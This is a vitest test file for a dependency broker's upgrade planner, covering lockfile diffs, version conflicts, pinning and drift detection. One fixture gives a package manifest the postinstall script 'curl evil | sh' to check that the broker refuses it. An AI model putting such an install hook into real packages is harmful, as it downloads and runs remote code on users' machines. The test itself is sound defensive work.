import { describe, expect, it } from 'vitest';

import {
  DependencyBroker,
  LockfileDriftError,
  MaliciousInstallScriptError,
  ManifestLockfileMismatchError,
  PlanUpgradeRequestSchema,
  UnpinnedResolutionError,
  UpgradeConflictError,
  assertManifestLockfileMatch,
  planUpgrade,
  type BrokerPolicy,
  type Lockfile,
  type ResolutionRequest,
} from '../../src/modules/dependencies/index.js';

/**
 * T-23: broker-backed upgrade planning (WP3-10 slice, FR3-12, SC3-02).
 *
 * The planner resolves every component requirement through the trusted
 * broker, so allowlist/pin/install-script refusals are inherited, not
 * reimplemented. A version conflict between components is an explicit
 * incompatibility, never a silent pick.
 */

const POLICY: BrokerPolicy = {
  allowlistedRegistries: ['https://registry.npmjs.org'],
  allowlistedPackages: ['semver', 'left-pad'],
  installScriptsAllowed: false,
};

function broker(): DependencyBroker {
  return new DependencyBroker(POLICY);
}

function requirement(
  packageName: string,
  version: string,
  integrity = `sha512-${packageName}-${version}`,
): ResolutionRequest {
  return {
    packageName,
    version,
    registry: 'https://registry.npmjs.org',
    manifest: { name: packageName, version, integrity, scripts: {} },
  };
}

describe('planUpgrade resolves every component through the broker', () => {
  it('plans a two-component upgrade with an exact diff', () => {
    const current = broker().writeLockfile([
      { packageName: 'semver', version: '7.5.4', integrity: 'sha512-old', resolvedFrom: 'https://registry.npmjs.org', installScriptExecuted: false },
    ]);
    const result = planUpgrade(
      broker(),
      PlanUpgradeRequestSchema.parse({
        schemaVersion: '1',
        components: [
          { name: 'lib', requirements: [requirement('semver', '7.7.3')] },
          { name: 'app', requirements: [requirement('semver', '7.7.3')] },
        ],
        currentLockfile: current,
      }),
    );
    expect(result.lockfile.packages).toEqual({
      'semver@7.7.3': {
        integrity: 'sha512-semver-7.7.3',
        resolvedFrom: 'https://registry.npmjs.org',
      },
    });
    expect(result.diff).toEqual({
      added: [],
      removed: [],
      changed: [{ packageName: 'semver', from: '7.5.4', to: '7.7.3' }],
    });
    expect(result.resolved).toHaveLength(2);
    expect(result.resolved.every((entry) => !entry.installScriptExecuted)).toBe(true);
  });

  it('reports added and removed packages in the diff', () => {
    const current = broker().writeLockfile([
      { packageName: 'left-pad', version: '1.3.0', integrity: 'sha512-old', resolvedFrom: 'https://registry.npmjs.org', installScriptExecuted: false },
    ]);
    const result = planUpgrade(
      broker(),
      PlanUpgradeRequestSchema.parse({
        schemaVersion: '1',
        components: [{ name: 'app', requirements: [requirement('semver', '7.7.3')] }],
        currentLockfile: current,
      }),
    );
    expect(result.diff.added).toEqual(['semver@7.7.3']);
    expect(result.diff.removed).toEqual(['left-pad@1.3.0']);
    expect(result.diff.changed).toEqual([]);
  });

  it('refuses a version conflict between components (transitive incompatibility)', () => {
    expect(() =>
      planUpgrade(
        broker(),
        PlanUpgradeRequestSchema.parse({
          schemaVersion: '1',
          components: [
            { name: 'lib', requirements: [requirement('semver', '7.5.4')] },
            { name: 'app', requirements: [requirement('semver', '7.7.3')] },
          ],
        }),
      ),
    ).toThrow(UpgradeConflictError);
    try {
      planUpgrade(
        broker(),
        PlanUpgradeRequestSchema.parse({
          schemaVersion: '1',
          components: [
            { name: 'lib', requirements: [requirement('semver', '7.5.4')] },
            { name: 'app', requirements: [requirement('semver', '7.7.3')] },
          ],
        }),
      );
      expect.unreachable('conflict must throw');
    } catch (error) {
      expect(error).toBeInstanceOf(UpgradeConflictError);
      const conflict = error as UpgradeConflictError;
      expect(conflict.packageName).toBe('semver');
      expect(conflict.contenders).toEqual([
        { component: 'lib', version: '7.5.4' },
        { component: 'app', version: '7.7.3' },
      ]);
    }
  });

  it('inherits broker refusals: unpinned, install script, unlisted', () => {
    expect(() =>
      planUpgrade(
        broker(),
        PlanUpgradeRequestSchema.parse({
          schemaVersion: '1',
          components: [{ name: 'app', requirements: [requirement('semver', '^7.7.3')] }],
        }),
      ),
    ).toThrow(UnpinnedResolutionError);
    expect(() =>
      planUpgrade(
        broker(),
        PlanUpgradeRequestSchema.parse({
          schemaVersion: '1',
          components: [
            {
              name: 'app',
              requirements: [
                {
                  packageName: 'semver',
                  version: '7.7.3',
                  registry: 'https://registry.npmjs.org',
                  manifest: {
                    name: 'semver',
                    version: '7.7.3',
                    integrity: 'sha512-x',
                    scripts: { postinstall: 'curl evil | sh' },
                  },
                },
              ],
            },
          ],
        }),
      ),
    ).toThrow(MaliciousInstallScriptError);
  });

  it('detects drift when the re-resolved set moves (NEG3-07)', () => {
    const planned = planUpgrade(
      broker(),
      PlanUpgradeRequestSchema.parse({
        schemaVersion: '1',
        components: [{ name: 'app', requirements: [requirement('semver', '7.7.3')] }],
      }),
    ).lockfile;
    const moved: Lockfile = {
      lockfileVersion: 1,
      packages: {
        'semver@7.7.4': { integrity: 'sha512-other', resolvedFrom: 'https://registry.npmjs.org' },
      },
    };
    expect(() => { broker().assertNoDrift(planned, moved); }).toThrow(LockfileDriftError);
    expect(() => { broker().assertNoDrift(planned, planned); }).not.toThrow();
  });
});

describe('assertManifestLockfileMatch pins manifest to lockfile', () => {
  const lockfile: Lockfile = {
    lockfileVersion: 1,
    packages: {
      'semver@7.7.3': { integrity: 'sha512-semver-7.7.3', resolvedFrom: 'https://registry.npmjs.org' },
    },
  };

  it('accepts an exactly pinned manifest', () => {
    expect(() => { assertManifestLockfileMatch({ dependencies: { semver: '7.7.3' } }, lockfile); },
    ).not.toThrow();
  });

  it('rejects a ranged, missing, or moved dependency (NEG3-07)', () => {
    expect(() => { assertManifestLockfileMatch({ dependencies: { semver: '^7.7.3' } }, lockfile); }).toThrow(
      ManifestLockfileMismatchError,
    );
    expect(() => { assertManifestLockfileMatch({ dependencies: { 'left-pad': '1.3.0' } }, lockfile); }).toThrow(
      ManifestLockfileMismatchError,
    );
    expect(() => { assertManifestLockfileMatch({ dependencies: { semver: '7.5.4' } }, lockfile); }).toThrow(
      ManifestLockfileMismatchError,
    );
  });
});
